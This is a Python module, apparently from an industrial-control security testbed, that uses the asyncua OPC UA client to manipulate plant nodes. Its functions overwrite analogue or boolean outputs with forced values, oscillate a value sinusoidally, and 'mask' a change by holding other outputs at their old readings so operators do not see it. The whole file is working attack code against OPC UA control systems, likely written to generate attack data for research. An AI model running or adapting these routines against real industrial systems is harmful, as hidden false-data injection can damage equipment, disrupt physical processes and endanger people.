import asyncio, math
from typing import Iterable, List, Tuple, Any
from asyncua import Node, Client #type:ignore
from asyncua.ua import VariantType # type:ignore
from opcua import AnalogueOutput, DigitalOutput

async def overwrite_attack(client:Client, 
                           node: Node, 
                           target:float,
                           duration:float,
                           rate:float):
    interval = 1.0/ rate
    loop = asyncio.get_event_loop()
    next_tick = loop.time()
    
    original = await node.read_value()
    end_time = next_tick + duration

    try:
        while loop.time() < end_time:
            await node.write_value(target, VariantType.Double)
            next_tick += interval
            await asyncio.sleep(max(0.0 , next_tick - loop.time()))
    finally:
        await node.write_value(original, VariantType.Double)

async def overwrite_bool(client:Client, 
                           node: Node, 
                           target:bool,
                           duration:float,
                           rate:float):
    interval = 1.0/ rate
    loop = asyncio.get_event_loop()
    next_tick = loop.time()
    
    original = await node.read_value()
    end_time = next_tick + duration

    try:
        while loop.time() < end_time:
            await node.write_value(bool(target), VariantType.Boolean)
            next_tick += interval
            await asyncio.sleep(max(0.0 , next_tick - loop.time()))
    finally:
        await node.write_value(bool(original), VariantType.Boolean)

async def oscillate_attack(client:Client, 
                           node: Node, 
                           target:float,
                           duration:float,
                           rate:float, 
                           period: float):
    interval = 1.0/ rate
    loop = asyncio.get_event_loop()
    start = loop.time()
    next_tick = start
    end_time = start + duration

    original = await node.read_value()

    pmax = max(original, target)
    pmin = min(original, target)
    pmid = (pmax + pmin) /2
    pamp = (pmax - pmin) /2

    coeff = (2*math.pi) /period

    try:
        while loop.time() < end_time:
            tim = loop.time() - start
            value = pamp * math.cos(coeff * tim ) + pmid
            await node.write_value(value, VariantType.Double)
            next_tick += interval
            await asyncio.sleep(max(0.0 , next_tick - loop.time()))
    finally:
        await node.write_value(original, VariantType.Double)

async def mask_attack(client:Client, 
                        target:Node,
                        target_value:float,
                           duration:float,
                           rate:float,
                           mask_nodes: Iterable[Node]):
    target_original = await target.read_value()
    masks: List[Tuple[Node, Any]] = []

    for node in mask_nodes:
        if node == target or getattr(node, "nodeid", None) == getattr(target, "nodeid", None):
            continue
        masks.append((node, await node.read_value()))

    interval = 1.0/ rate
    loop = asyncio.get_event_loop()
    next_tick = loop.time()
    end_time = next_tick + duration

    try:
        while loop.time() < end_time:
            writes = [target.write_value(target_value, VariantType.Double)]
            for node, value in masks:
                writes.append(node.write_value(value))
            await asyncio.gather(*writes)
            next_tick += interval
            await asyncio.sleep(max(0.0 , next_tick - loop.time()))
    finally:
        tasks = [target.write_value(target_original, VariantType.Double)]
        for node, value in masks:
            tasks.append(node.write_value(value))
        await asyncio.gather(*tasks)
        
def mask_members():
    analogue_output = [m for m in AnalogueOutput if not m.name.startswith("CTRL_") and m.name!= "INT_SimulationTime"]
    digital_output = list(DigitalOutput)
    return analogue_output + digital_output